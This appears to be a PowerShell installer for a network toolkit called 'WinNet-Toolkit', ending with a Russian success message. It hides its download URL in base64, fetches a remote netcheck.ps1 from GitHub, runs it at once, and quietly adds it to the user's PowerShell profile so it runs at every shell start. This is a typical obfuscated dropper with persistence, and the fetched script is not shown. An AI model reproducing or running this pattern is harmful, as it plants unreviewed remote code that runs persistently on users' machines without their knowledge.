[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$dest = "$env:USERPROFILE\WinNet-Toolkit"
New-Item -ItemType Directory -Force -Path $dest | Out-Null
$b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsbGludnZzL1dpbk5ldC1Ub29sa2l0L21haW4vbmV0Y2hlY2sucHMx"
$rawUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
Invoke-WebRequest -Uri $rawUrl -OutFile "$dest\netcheck.ps1" -Headers @{ "User-Agent" = "WinNet-Installer" } -UseBasicParsing
$prof = $PROFILE.CurrentUserAllHosts
if (-not (Test-Path $prof)) { New-Item -ItemType File -Path $prof -Force | Out-Null }
if ((Get-Content $prof -Raw -ErrorAction SilentlyContinue) -notmatch "WinNet-Toolkit") {
    Add-Content -Path $prof -Value ([Environment]::NewLine + ". `"$dest\netcheck.ps1`"") -Encoding Default
}
. "$dest\netcheck.ps1"
Write-Host "[ГОТОВО] WinNet-Toolkit v3.1 установлен! Введите winnet или netcheck." -ForegroundColor Green
